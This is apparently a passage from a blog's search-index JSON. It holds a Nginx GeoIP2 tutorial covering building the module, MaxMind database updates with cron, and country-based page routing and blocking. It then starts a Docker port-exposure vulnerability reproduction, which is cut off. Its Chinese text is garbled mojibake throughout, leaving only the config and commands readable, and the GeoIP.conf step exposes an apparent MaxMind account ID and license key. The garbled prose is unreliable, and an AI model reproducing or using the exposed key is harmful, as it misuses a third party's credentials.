æŒ‡ä»¤ã€‚\n\nå¦‚æœé€’å½’æœç´¢è¢«ç¦ç”¨ï¼Œé‚£ä¹ˆå°†ä½¿ç”¨â€œX-Forwarded-Forâ€ä¸­å‘é€çš„æœ€åä¸€ä¸ªåœ°å€ï¼Œè€Œä¸æ˜¯ä¸ä¸€ä¸ªå—ä¿¡ä»»åœ°å€åŒ¹é…çš„åŸå§‹å®¢æˆ·ç«¯åœ°å€ã€‚\n\nå¦‚æœå¯ç”¨äº†é€’å½’æœç´¢ï¼Œé‚£ä¹ˆå°†ä½¿ç”¨â€œX-Forwarded-Forâ€ä¸­å‘é€çš„æœ€åä¸€ä¸ªéä¿¡ä»»åœ°å€ï¼Œè€Œä¸æ˜¯ä¸å¯ä¿¡åœ°å€ä¹‹ä¸€åŒ¹é…çš„åŸå§‹å®¢æˆ·ç«¯åœ°å€ã€‚\n\n\næ¨¡å—ä½¿ç”¨å‚è€ƒåœ°å€ï¼šhttps://github.com/leev/ngx_http_geoip2_module/#example-usage\nGeoip2 æ¨¡å—ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“æè¿°: æœ‰å¯èƒ½æ­¤æ—¶ä½ é€šè¿‡æºç ç¼–è¯‘æ–¹å¼å®‰è£… Nginx äº† ï¼Œé‚£å¦‚ä½•åŠ å…¥æ–°çš„Nginxæ¨¡å—å‘¢?\nç­”: é‚£å°±æ˜¯é‡æ–°ç¼–è¯‘ Nginx å³å¯ï¼Œæˆ‘ä»¬ä¸éœ€è¦æ‰§è¡Œmake installé‡æ–°å®‰è£… Nginx å…·ä½“æ“ä½œå¦‚ä¸‹æ‰€ç¤ºã€‚\næ¸©é¦¨æç¤º: å¦‚æœä½ æ²¡æœ‰NginxäºŒè¿›åˆ¶å®‰è£…ç¯å¢ƒï¼Œå¯ä»¥è®¿é—®ã€è¿ç»´å®è·µ-æœ€æ–°NginxäºŒè¿›åˆ¶æ„å»ºç¼–è¯‘lua-nginx-moduleåŠ¨æ€é“¾æ¥Luaè„šæœ¬è®¿é—®Redisæ•°æ®åº“è¯»å–é™æ€èµ„æºéšå¼å±•ç°ã€‘æ–‡ç« ï¼Œå¹¶æŒ‰ç…§å…¶æµç¨‹è¿›è¡ŒäºŒè¿›åˆ¶ç¼–è¯‘æ„å»ºNginxå½“å‰æœ€æ–°çš„ç¨³å®šç‰ˆæœ¬ 1.22.0\nStep 1.æ‰§è¡Œnginx -vè·å–åŸç¼–è¯‘æ„å»ºçš„å‚æ•°ã€‚\nnginx version: nginx&#x2F;1.22.0\nbuilt by gcc 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)\nbuilt with OpenSSL 1.1.1q  5 Jul 2022\nTLS SNI support enabled\nconfigure arguments: --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx --with-pcre&#x3D;..&#x2F;pcre-8.45 ......  --with-ld-opt&#x3D;-Wl,--as-needed,-O1,--sort-common\n\nStep 2.æ­¤å¤„è¡¥å……ä¸€ç‚¹ï¼Œä½ å®Œå…¨å¯æŒ‰ç…§è‡ªèº«éœ€æ±‚ä½¿ç”¨--add-moduleè¿›è¡Œé™æ€é“¾æ¥åº“å®‰è£…ï¼Œæˆ–è€…ä½¿ç”¨--add-dynamic-moduleè¿›è¡ŒåŠ¨æ€é“¾æ¥åº“å®‰è£…ã€‚\n# åŠ¨æ€é“¾æ¥åº“å®‰è£…æ¨¡å— ï¼ˆç»å¯¹æˆ–è€…ç›¸å¯¹è·¯å¾„ï¼‰\n--add-dynamic-module&#x3D;..&#x2F;ngx_http_geoip2_module-3.4\n--add-dynamic-module&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;ngx_http_geoip2_module-3.4\n\n# é™æ€é“¾æ¥åº“ç”Ÿæˆæ¨¡å—\n--add-module&#x3D;..&#x2F;ngx_http_geoip2_module-3.4\n\n\nStep 3.å°†æ­¥éª¤1è·å–çš„å‚æ•°åŠ å…¥åˆ°./configure, å¹¶åœ¨æœ«å°¾æ·»åŠ ä¸Š--add-dynamic-module=/usr/local/src/ngx_http_geoip2_module-3.4, ä»¥é‡æ–°æ„å»ºæ”¯æŒ geoip2 æ¨¡å—çš„ nginx äºŒè¿›åˆ¶æ–‡ä»¶ã€‚\ncd &#x2F;usr&#x2F;local&#x2F;src&#x2F;nginx-1.22.0&#x2F;\n\n# é¢„ç¼–è¯‘å‚æ•°\n.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx --user&#x3D;nginx --group&#x3D;nginx --with-pcre&#x3D;..&#x2F;pcre-8.45 --with-zlib&#x3D;..&#x2F;zlib-1.2.12 --with-openssl&#x3D;..&#x2F;openssl-1.1.1q --sbin-path&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx --conf-path&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;nginx.conf --pid-path&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;nginx.pid --error-log-path&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log --http-log-path&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log --lock-path&#x3D;&#x2F;var&#x2F;run&#x2F;nginx.lock --modules-path&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;modules --http-client-body-temp-path&#x3D;&#x2F;var&#x2F;cache&#x2F;nginx&#x2F;client_temp --http-proxy-temp-path&#x3D;&#x2F;var&#x2F;cache&#x2F;nginx&#x2F;proxy_temp --http-fastcgi-temp-path&#x3D;&#x2F;var&#x2F;cache&#x2F;nginx&#x2F;fastcgi_temp --http-uwsgi-temp-path&#x3D;&#x2F;var&#x2F;cache&#x2F;nginx&#x2F;uwsgi_temp --http-scgi-temp-path&#x3D;&#x2F;var&#x2F;cache&#x2F;nginx&#x2F;scgi_temp --with-threads --with-http_sub_module --with-http_v2_module --with-http_auth_request_module --with-http_realip_module --with-http_secure_link_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_ssl_module --with-http_slice_module --with-http_stub_status_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-stream --with-stream_realip_module --with-stream_ssl_module --with-stream_ssl_preread_module --with-stream_geoip_module --with-mail --with-mail_ssl_module --with-http_addition_module --with-http_random_index_module --with-compat --with-file-aio --with-cc-opt&#x3D;&#39;-Os -fomit-frame-pointer -g&#39; --with-ld-opt&#x3D;-Wl,-rpath,&#x2F;usr&#x2F;local&#x2F;luajit&#x2F;lib,--as-needed,-O1,--sort-common --add-module&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;ngx_devel_kit-0.3.1 --add-module&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;lua-nginx-module-0.10.21 --add-dynamic-module&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;echo-nginx-module-0.62 --add-dynamic-module&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;ngx_http_geoip2_module-3.4\n\n# ç¼–è¯‘æ„å»º\nmake\n\n# ç¼–è¯‘åå°†ä¼šåœ¨objsç›®å½•ç”ŸæˆåŠ¨æ€é“¾æ¥åº“ï¼Œæˆ‘ä»¬éœ€å¤åˆ¶åˆ° &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;modules\n$ ls objs&#x2F;*.so\n  objs&#x2F;ngx_http_geoip2_module.so  objs&#x2F;ngx_stream_geoip2_module.so\n$ cp -a objs&#x2F;*.so &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;modules\n$ ls &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;modules\nngx_http_echo_module.so  ngx_http_geoip2_module.so  ngx_stream_geoip2_module.so\n\n# ç„¶åä½¿ç”¨objsç›®å½•ä¸­ç”Ÿæˆçš„ nginx äºŒè¿›åˆ¶æ–‡ä»¶è¦†ç›– &#x2F;usr&#x2F;sbin&#x2F;nginx\n$ cp -a objs&#x2F;nginx &#x2F;usr&#x2F;sbin&#x2F;nginx\n$ make upgrade \n\n# æœ€åæ‰§è¡Œæ­¤å‘½ä»¤éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸ\nnginx -V\n\nGeoLite2 æ•°æ®åº“ä¸‹è½½æè¿°: Nginx çš„Â ngx_*_geoip2_moduleÂ æ¨¡å—ä¾èµ–äº GeoLite2 æ•°æ®åº“, å…è´¹çš„ GeoLite2 æ•°æ®åº“å¯ä» Maxminds ç½‘ç«™è·å¾—ï¼ˆéœ€è¦æ³¨å†Œï¼‰ï¼ŒGeoLite2 æ•°æ®åº“åŸºäº IP åœ°å€çš„æ•°æ®åº“å’Œ Web æœåŠ¡ï¼Œæä¾›æœ‰å…³åœ°ç†ä½ç½®ã€äººå£ç»Ÿè®¡å’Œç”¨æˆ·ä»¥åŠåŒ¿åè€…çš„æ•°æ®ã€‚\nå¦‚æœä½ æƒ³ä¸‹è½½ä¸æ›´æ–° GeoLite2 æ•°æ®åº“,æ‚¨éœ€è¦æ‹¥æœ‰ MaxMind å¸æˆ· ID å’Œè®¸å¯è¯å¯†é’¥, å¹¶ä¸”å½“æˆ‘ä»¬åœ¨ nginx ä¸­ä½¿ç”¨åˆ™è¯¥ GeoIP2 æ¨¡å—ï¼Œåœ¨æˆ‘ä»¬è¯·æ±‚æ—¶Nginxæ—¶æ ¹æ®IPåœ°å€æ¥è¯†åˆ«æ¥æºå›½å®¶åŸå¸‚ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦æå‰ä¸‹è½½è½½è¯¥æ•°æ®åº“.\nç®€å•æµç¨‹: é¦–å…ˆè®¿é—®Â MaxmindsÂ å®˜ç½‘ï¼Œç„¶åæ³¨å†Œç™»é™†åˆ°ç”¨æˆ·åå°ï¼Œåˆ›å»ºå¹¶è·å–Â License Key, æœ€åä¸‹è½½ GeoLite2 æ•°æ®åº“è¯¥å‹ç¼©åŒ…ï¼Œé‡Œé¢åŒ…å«çš„æ˜¯äºŒè¿›åˆ¶mmdbæ ¼å¼çš„åº“æ–‡ä»¶ã€‚\nMaxminds å®˜ç½‘åœ°å€:Â https://maxmind.comGeoIP2 Web æœåŠ¡æ¼”ç¤ºï¼ˆæ¯å¤©25æ¬¡é™é¢ï¼‰ï¼šhttps://www.maxmind.com/en/geoip2-precision-demo?ip_address=223.6.6.6Locate My IP Address :Â https://www.maxmind.com/en/locate-my-ip-address\nå¦‚æœæ— æ³•ç™»å½•å®˜ç½‘æˆ–è€…ä½ ä¸æƒ³æ³¨å†Œç™»é™†ï¼Œä¹Ÿå¯ä»¥ä¸‹è½½åšä¸»å·²ç»ä»å®˜ç½‘ä¸‹è½½å¥½çš„ GeoIP2 æ•°æ®åº“ã€‚\nGeoLite2 æ•°æ®åº“è‡ªåŠ¨æ›´æ–°æè¿°: ä¸ºäº†ä¿è¯æ•°æ®åº“ä¸­å›½å®¶ä¸åŸå¸‚çš„å‡†ç¡®æ€§ï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®cronå®šæ—¶ä»»åŠ¡æ¥æ›´æ–°MaxMindæä¾›çš„GeoLite2-Country.mmdbæˆ–è€…GeoLite2-City.mmdbæ•°æ®åº“, ä»¥ä¿è¯å…¶æ•°æ®åº“ä¿æŒæœ€æ–°ã€‚\n æ“ä½œæµç¨‹\n\nStep 1.ä½¿ç”¨aptå‘½ä»¤å¸®åŠ©é…ç½®å’Œæ›´æ–° GeoIP2 &#x2F; GeoLite2 çš„è½¯ä»¶åŒ…ã€‚\napt install -y geoipupdate\n\nStep 2.ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€å¹¶ç¼–è¾‘ä½äºÂ /etc/GeoIP.confÂ çš„Â MaxMind GeoIP confÂ æ–‡ä»¶, ä½¿ç”¨ä¸Šè¿°æ­¥éª¤è·å–çš„ AccountID å’Œ LicenseKey å­—æ®µä¿¡æ¯å¡«å…¥å…¶æ–‡ä»¶ä¸­, ä¹‹åä¾¿å¯æ‰§è¡Œè¿›è¡Œåœ°ç†ä½ç½®æ•°æ®åº“ï¼Œæ“ä½œåå¦‚ä¸‹å›¾æ‰€ç¤º\n\n\n$ tee &#x2F;etc&#x2F;GeoIP.conf &lt;&lt;&#39;EOF&#39;\nAccountID 696302\nLicenseKey ycm3xq02oE7QXMOw\nEditionIDs GeoLite2-Country GeoLite2-City\nDatabaseDirectory &#x2F;usr&#x2F;local&#x2F;GeoIP2\nEOF\n\nls -alh &#x2F;usr&#x2F;local&#x2F;GeoIP2  # æ‰‹åŠ¨æ›´æ–°å‰\ngeoipupdate --stack-trace\nls -alh &#x2F;usr&#x2F;local&#x2F;GeoIP2  # æ‰‹åŠ¨æ›´æ–°å\n\n\nStep 3.ä¸ºäº†æ–¹ä¾¿è¿ç»´ç®¡ç†æˆ‘ä»¬å¯ä»¥åˆ›å»ºå®šæ—¶ä»»åŠ¡è‡ªåŠ¨æ›´æ–°ï¼Œæé«˜å·¥ä½œæ•ˆç‡ã€‚\n\n# æŸ¥è¯¢æ‰§è¡Œæ–‡ä»¶ç»å¯¹è·¯å¾„\n$ which geoipupdate\n&#x2F;usr&#x2F;bin&#x2F;geoipupdate\n\n# æ¯å‘¨å¤©çš„å‡Œæ™¨æ›´æ–°æ•°æ®åº“\n$ crontab -e\n0 * * * 6 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;geoipupdate &gt; &#x2F;var&#x2F;log&#x2F;geoipupdate.log 2&gt;&amp;1\nå®˜ç½‘æ›´æ–°å‚è€ƒåœ°å€:Â https://dev.maxmind.com/geoip/updating-databases?lang=en.\n0x02å®è·µ1.ä½¿ç”¨GeoIP2æ¨¡å—è¯·æ±‚å®¢æˆ·ç«¯çš„IPåœ°å€å›½å®¶çœä»½ç»çº¬åº¦å±•ç¤ºæè¿°: æœ¬æ¬¡å®è·µå°†æ ¹æ®è¯·æ±‚è€…çš„å›½å®¶æ˜¾ç¤ºä¸­æ–‡æˆ–è€…è‹±æ–‡çš„IPåœ°å€ä½ç½®ç­‰ç›¸å…³ä¿¡æ¯åœ¨ç½‘é¡µä¸Šï¼Œé€šè¿‡å‰é¢çš„å­¦ä¹ ï¼Œæˆ‘ä»¬çŸ¥é“ geoip2 åœ¨æ£€ç´¢æœ‰å…³ geoip æ•°æ®åº“çš„å…ƒæ•°æ®æ—¶ï¼Œå…¶è¯­æ³•æ ¼å¼ä¸ºÂ $variable_name metadata &lt;field&gt;,\nå®è·µæµç¨‹\n\nStep 1.ç¼–è¾‘Nginx.confä¸»é…ç½®æ–‡ä»¶åœ¨ http ç‰‡æ®µä¸­ï¼Œè‡ªå®šä¹‰å®šä¹‰è®¿é—®æ—¥å¿—æ ¼å¼ååŠ å…¥å¦‚ä¸‹ä¸¤ä¸ª geoip2 æŒ‡ä»¤ç‰‡æ®µã€‚http &#123;\n  .....\n  geoip2 &#x2F;usr&#x2F;local&#x2F;GeoIP2&#x2F;GeoLite2-Country.mmdb &#123;\n    # å¯ç”¨è‡ªåŠ¨é‡æ–°åŠ è½½å°†ä½¿ nginx ä»¥æŒ‡å®šçš„æ—¶é—´é—´éš”æ£€æŸ¥æ•°æ®åº“çš„ä¿®æ”¹æ—¶é—´ï¼Œå¦‚æœå‘ç”Ÿæ›´æ”¹åˆ™é‡æ–°åŠ è½½ã€‚\n    auto_reload 7d;\n    $geoip2_country_code country names en;\n  &#125;\n  \n  geoip2 &#x2F;usr&#x2F;local&#x2F;GeoIP2&#x2F;GeoLite2-City.mmdb &#123;\n    # ä¸­å›½IPè®¿é—®éƒ½æ˜¾ç¤ºä¸­æ–‡\n    $geoip2_data_country &quot;default&#x3D;ä¸­å›½&quot; source&#x3D;$remote_addr country names zh-CN;  # ä¸­å›½\n    $geoip2_data_country_code country iso_code;                  # CN\n    $geoip2_data_country_continent continent names zh-CN;        # äºšæ´²\n    $geoip2_data_country_continent_code continent code;          # AS\n    $geoip2_data_province_name subdivisions 0 names zh-CN;       # æµ™æ±Ÿçœ\n    $geoip2_data_province_isocode subdivisions 0 names iso_code; # &quot;ZJ&quot;\n    $geoip2_data_city city names zh-CN;                          # æ­å·\n    $geoip2_data_city_longitude location longitude;              # 120.161200\n    $geoip2_data_city_latitude location latitude;                # 30.299400\n    $geoip2_data_city_time_zone location time_zone;              # &quot;Asia&#x2F;Shanghai&quot;\n  \n    # ä¸­å›½ä»¥å¤–çš„è®¿é—®éƒ½æ˜¯æ˜¾ç¤ºè‹±æ–‡\n    $geoip2_data_country_en &quot;default&#x3D;United States&quot; source&#x3D;$remote_addr country names en;  # United States\n    $geoip2_data_country_code country iso_code;                     # US\n    $geoip2_data_country_continent_en continent names en;           # North America\n    $geoip2_data_country_continent_code continent code;             # NA\n    $geoip2_data_province_name_en subdivisions 0 names en;          # &quot;&quot;\n    $geoip2_data_province_isocode subdivisions 0 names iso_code;    # &quot;&quot;\n    $geoip2_data_city city names en;                                # æ­å·\n    $geoip2_data_city_longitude location longitude;                 # 120.161200\n    $geoip2_data_city_latitude location latitude;                   # 30.299400\n    $geoip2_data_city_time_zone location time_zone;                 # &quot;Asia&#x2F;Shanghai&quot;\n  &#125;\n  ....\n  \n  map $geoip2_data_country_code $CN &#123;\n    CN yes;\n    TW yes;\n    HK yes;\n    MO yes;\n    default no;       \n  &#125;\n\n&#125;\nStep 2.åŒæ ·ç¼–è¾‘conf.d/demo.conf, æ­¤å¤„ä½¿ç”¨è™šæ‹Ÿä¸»æœºå¤´(demo.weiyigeek.top)åšæ¼”, åŠ å…¥å¦‚ä¸‹æŒ‡ä»¤ç‰‡æ®µï¼Œå…¶ä¸»è¦ä½œç”¨æ˜¯æ ¹æ®åŒºå…¶åœ°åŒºï¼Œä½¿ç”¨ä¸­è‹±æ–‡æ˜¾ç¤ºè¯·æ±‚è€…IPåœ°ç†ä½ç½®ä¿¡æ¯ã€‚$ vim conf.d&#x2F;demo.conf\nserver &#123;\n  ...\n  # ç²¾å‡†åŒ¹é…\n  location &#x3D; &#x2F;api&#x2F;v1&#x2F;ip &#123;\n    # å½“è®¿é—®è€…IPæ¥è‡ª &#96;CN|TW|HK|MO&#96; æ—¶å°†ä¼šä»¥jsonçš„å½¢å¼è¿›è¡Œè¿”å›ä¸­æ–‡çš„IPåœ°å€ä¿¡æ¯ã€‚\n    if ( $geoip2_data_country_code ~* (CN|TW|HK|MO) )&#123;\n      rewrite (.*)  &#x2F;api&#x2F;v1&#x2F;ip&#x2F;cn last;\n    &#125;\n    rewrite (.*) &#x2F;api&#x2F;v1&#x2F;ip&#x2F;en last;\n  &#125;\n  \n  # ä¸­æ–‡æ˜¾ç¤º\n  location &#x2F;api&#x2F;v1&#x2F;ip&#x2F;cn &#123;\n    default_type application&#x2F;json;\n    return 200 &#39;&#123;&quot;ip&quot;:&quot;$remote_addr&quot;,&quot;country&quot;:&#123;&quot;name&quot;: &quot;$geoip2_data_country&quot;, &quot;iso_code&quot;:  &quot;$geoip2_data_country_code&quot;, &quot;continent&quot;: &quot;$geoip2_data_country_continent&quot;,&quot;continent_code&quot;: &quot;$geoip2_data_country_continent_code&quot;&#125;,&quot;province&quot;:&#123;&quot;name&quot;:&quot;$geoip2_data_province_name&quot;,&quot;iso_code&quot;:&quot;$geoip2_data_province_isocode&quot;&#125;,&quot;city&quot;:&#123;&quot;name&quot;:&quot;$geoip2_data_city&quot;,&quot;timezone&quot;:&quot;$geoip2_data_city_time_zone&quot;&#125;,&quot;location&quot;:&#123;&quot;longitude&quot;:&quot;$geoip2_data_city_longitude&quot;,&quot;latitude&quot;:&quot;$geoip2_data_city_latitude&quot;&#125;&#125;&#39;;\n  &#125;\n  \n  # è‹±æ–‡æ˜¾ç¤º\n  location &#x2F;api&#x2F;v1&#x2F;ip&#x2F;en &#123;\n    default_type application&#x2F;json;\n    return 200 &#39;&#123;&quot;ip&quot;:&quot;$remote_addr&quot;,&quot;country&quot;:&#123;&quot;name&quot;: &quot;$geoip2_data_country_en&quot;, &quot;iso_code&quot;:  &quot;$geoip2_data_country_code&quot;, &quot;continent&quot;: &quot;$geoip2_data_country_continent_en&quot;,&quot;continent_code&quot;: &quot;$geoip2_data_country_continent_code&quot;&#125;,&quot;province&quot;:&#123;&quot;name&quot;:&quot;$geoip2_data_province_name_en&quot;,&quot;iso_code&quot;:&quot;$geoip2_data_province_isocode&quot;&#125;,&quot;city&quot;:&#123;&quot;name&quot;:&quot;$geoip2_data_city&quot;,&quot;timezone&quot;:&quot;$geoip2_data_city_time_zone&quot;&#125;,&quot;location&quot;:&#123;&quot;longitude&quot;:&quot;$geoip2_data_city_longitude&quot;,&quot;latitude&quot;:&quot;$geoip2_data_city_latitude&quot;&#125;&#125;&#39;;\n  &#125;\n  ....\n&#125;\nStep 3.é…ç½® nginx æ ¸éªŒä¸é‡è½½ nginx æœåŠ¡, æ­¤å¤„ä½¿ç”¨ä¸åŒçš„ç½‘ç»œä½¿ç”¨æµè§ˆå™¨è¿›è¡Œè®¿é—®https://demo.weiyigeek.top/api/v1/ipéªŒè¯, ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤º:ã€‚nginx -t &amp;&amp; nginx -s reload\n\n\n2.ä½¿ç”¨GeoIP2æ¨¡å—é™æ­¢æŸä¸€å›½å®¶åœ°åŒºçš„IPåœ°å€è®¿é—®ç½‘ç«™æè¿°: ä¸ºäº†å‡å°‘å›½å¤–çš„æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥å°†æŒ‡å®šçš„åœ°åŒºIPè®¿é—®è¿›è¡Œæ”¾è¡Œï¼Œé™¤æ­¤ä¹‹å¤–çš„å…¨éƒ¨æ‹’ç»ã€‚\nå®é™…æµç¨‹:\n\nStep 1.åœ¨ nginx.conf ä¸­æ·»åŠ  map æŒ‡ä»¤å¹¶è¿›è¡Œå¦‚ä¸‹é…ç½®, é¢„å®šä¹‰äº†å¯ä»¥è®¿é—®ç½‘ç«™çš„åœ°åŒºã€‚http &#123;\n\n....\n\nmap $geoip2_data_country_code $allow_visit &#123;  \n    CN yes;  \n    TW yes;  \n    HK yes;  \n    MO yes;  \n    default no;  \n\n&#125;\n\n....\n\n&#125;\næ¸©é¦¨æç¤º:\n\n\nmap æŒ‡ä»¤æ˜¯ç”±ngx_http_map_moduleæ¨¡å—æä¾›çš„,é»˜è®¤æƒ…å†µä¸‹å®‰è£… nginx éƒ½ä¼šå®‰è£…è¯¥æ¨¡å—.\n\nmap çš„ä¸»è¦ä½œç”¨æ˜¯â€™åˆ›å»ºè‡ªå®šä¹‰å˜é‡â€™,é€šè¿‡ä½¿ç”¨ nginx çš„â€™å†…ç½®â€™å˜é‡,å»â€™åŒ¹é…â€™æŸäº›ç‰¹å®šè§„åˆ™; å¦‚æœåŒ¹é…æˆåŠŸåˆ™è®¾ç½®æŸä¸ªå€¼ç»™è‡ªå®šä¹‰å˜é‡,è€Œè¿™ä¸ªâ€™è‡ªå®šä¹‰å˜é‡â€™åˆå¯ä»¥â€™ç”¨ä½œä»–ç”¨â€™ã€‚\n\n\n\nStep 2.åœ¨demo.confé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªè®¿é—®éªŒè¯çš„ç¤ºä¾‹ã€‚# è®¿é—®è¯¥é¡µé¢å¦‚æœ$allow_visitå˜é‡ä¸ä¸ºyesåˆ™è¿”å›403é¡µé¢,å¦åˆ™è¿”å›è®¿é—®è€…çš„IPåœ°åŒºä¿¡æ¯ã€‚\nlocation &#x2F;allow&#x2F;html &#123;\n  default_type text&#x2F;html;\n  if ($allow_visit !&#x3D; yes ) &#123;\n    return 403 &quot;IP [ $remote_addr ] ç¦æ­¢è®¿é—®! &lt;br&gt; $remote_addr - $geoip2_data_country - $geoip2_data_country_code - $geoip2_data_country_continent&quot;;\n  &#125; \n  return 200 &quot;æ¬¢è¿IPä¸º [ $remote_addr ] ç”¨æˆ·è¿›è¡Œè®¿é—®! &lt;br&gt; $remote_addr - $geoip2_data_country - $geoip2_data_country_code - $geoip2_data_country_continent&quot;;\n&#125;\nStep 3.åŒæ ·ä¿®æ”¹å®Œæˆåï¼Œæˆ‘ä»¬éœ€è¦é’ˆå¯¹nginxé…ç½®æ ¸éªŒä¸é‡æ–°åŠ è½½é…ç½®Â nginx -t &amp;&amp; nginx -s reloadÂ ï¼ˆPS: åç»­å°†ä¸å†æç¤ºäº†ï¼Œæƒ³å¿…å¤§å®¶éƒ½èŠç†Ÿäºå¿ƒäº†ï¼‰, ï¼Œä¹‹ååˆ†åˆ«ä½¿ç”¨å·¥å…·è¿›è¡Œè®¿é—®éªŒè¯ï¼Œç»“æœå¦‚ä¸‹æ‰€ç¤ºã€‚\n\n3.ä½¿ç”¨GeoIP2æ¨¡å—å®ç°ä¸åŒå›½å®¶è®¿é—®è¿›å…¥ä¸åŒç›®å½•é¡µé¢æè¿°: åœ¨æŸäº›æ—¶åˆ»æˆ‘ä»¬å¯èƒ½ä¼šå¯¹ä¸åŒåœ°åŒºæ¥æºè®¿é—®çš„å®¢æˆ·å±•ç¤ºä¸åŒçš„é¡µé¢ï¼Œä¾‹å¦‚å›½å†…æˆ‘å°±æ˜¾ç¤ºä¸­æ–‡çš„é¡µé¢ï¼Œè€Œæ–°åŠ å¡æˆ‘å°±æ˜¾ç¤ºè‹±æ–‡çš„é¡µé¢ï¼Œè¿™æ ·ä¸€æ¥å°±æ›´åŠ äººæ€§åŒ–ä¸€ç‚¹ã€‚\nç¤ºä¾‹æ¼”ç¤ºåœ¨/usr/local/nginx/htmlç›®å½•ä¸­åˆ›å»ºch/enå­ç›®å½•ï¼ŒåŒæ—¶å‡†å¤‡ä¸¤ä¸ªä¸åŒåœ°åŒºè®¿é—®çš„æµ‹è¯•é¡µé¢:\n$ tree &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html  \nâ”œâ”€â”€ ch  \nâ”‚   â””â”€â”€ index.html  \nâ”œâ”€â”€ en  \nâ”‚   â””â”€â”€ index.html  \n  \n  \n\n$ cat ch&#x2F;index.html\n\n&lt;h1&gt;ä¸­æ–‡ç«™ç‚¹&lt;&#x2F;h1&gt;\n\n&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;blog.weiyigeek.top&quot; frameborder&#x3D;&quot;0&quot; width&#x3D;&quot;500&quot;&gt;&lt;&#x2F;iframe&gt;\nNginx é…ç½®ä¸­ä½¿ç”¨GeoIPå¤„ç†è®¿é—®è¯·æ±‚ã€‚\nhttp &#123;\n....\n  map $geoip2_data_country_code $lang_ch &#123;\n    CN yes;\n    TW yes;\n    HK yes;\n    MO yes;\n    default no;\n  &#125;\n....\n server &#123;\n    listen       80;\n    server_name  demo.weiyigeek.top;\n    location &#x2F; &#123;\n      set $rootpath html&#x2F;ch; # å…³é”®ç‚¹è®¾ç½®ä¸€ä¸ªæ ¹ç›®å½•å˜é‡ã€‚\n      if ($lang_ch &#x3D; no) &#123; \n        set $rootpath html&#x2F;en;\n      &#125;\n      add_header program-path $rootpath; # å…³é”®ç‚¹å†™å…¥åˆ°å“åº”å¤´ä¸­ã€‚\n      add_header country-code $geoip2_data_country_code;\n      root $rootpath;\n      index index.html index.htm;\n    &#125;\n  &#125;\n&#125;\n\n\nReferenceså¦‚ä½•ç”¨ Nginx ç¦æ­¢å›½å¤– IP è®¿é—®ç½‘ç«™Nginxä½¿ç”¨geoip2æ¨¡å—å¹¶åˆ©ç”¨MaxMindçš„GeoIP2æ•°æ®åº“å®ç°å¤„ç†ä¸åŒå›½å®¶æˆ–åŸå¸‚çš„è®¿é—®æœ€ä½³å®è·µæŒ‡å—\n","slug":"Nginx+GeoIP2","date":"2022-08-10T08:40:59.440Z","categories_index":"å¼€æºWAFäº§å“é€‰å‹","tags_index":"ä¼˜ç§€æ–‡ç« æ”¶è—,WAF,Nginx,å¼€æºWAFäº§å“é€‰å‹,modsecurity,å®‰å…¨å»ºè®¾,GeoIP","author_index":"Moses"},{"id":"329456693c3fc747f7090ff9cac97881","title":"å®¹å™¨å®‰å…¨-Dockeré…ç½®å®‰å…¨ç½‘ç»œè®¿é—®æ§åˆ¶","content":"Dockeré…ç½®å®‰å…¨ç½‘ç»œè®¿é—®æ§åˆ¶æ¦‚è¿°å’ŒèƒŒæ™¯Docker æ˜¯ä¸€ä¸ªç”¨äºå¼€å‘ã€å‘å¸ƒå’Œè¿è¡Œåº”ç”¨ç¨‹åºçš„å¼€æ”¾å¹³å°ã€‚Docker ä½¿æ‚¨èƒ½å¤Ÿå°†åº”ç”¨ç¨‹åºä¸åŸºç¡€æ¶æ„åˆ†ç¦»ï¼Œä»¥ä¾¿å¿«é€Ÿäº¤ä»˜è½¯ä»¶ã€‚åœ¨å…¨çƒèŒƒå›´å†…ï¼ŒDockerå·²ç»å¾—åˆ°æå¤§çš„åº”ç”¨ã€‚å¾ˆå¤šæ—¶å€™ï¼Œç”¨æˆ·å¹¶ä¸å¸Œæœ›Docker æœåŠ¡å¯¹å¤–å¼€æ”¾ã€‚å› æ­¤ä¼šé€šè¿‡åƒ -p 127.0.0.1:80:80è¿™æ ·çš„å‚æ•°å°†ç«¯å£æš´éœ²åˆ°å›ç¯åœ°å€å¹¶ä»…ä¾›æœ¬åœ°è®¿é—®ï¼Œä½†æ˜¯ç”±äºä¸æ°å½“çš„å®‰å…¨é…ç½®å¯¼è‡´å¤–éƒ¨æ”»å‡»è€…ä»ç„¶å¯ä»¥è®¿é—®æœ¬åœ°æœåŠ¡ã€‚\t\nå½±å“ç‰ˆæœ¬\n\n\n\n\n\n\n\n\nDocker &lt;&#x3D; 20.10.5ï¼Œä½†æ˜¯ä¸ä¸€å®šã€‚\næ¼æ´å¤ç°æµ‹è¯•ç¯å¢ƒ\ntarget 10.1.82.97\ntarget docker version Docker version 20.10.7, build f0df350\nattack 10.1.82.95\n\n\næŸ¥çœ‹target docker version[root@tvy-base-worker-03 ~]# 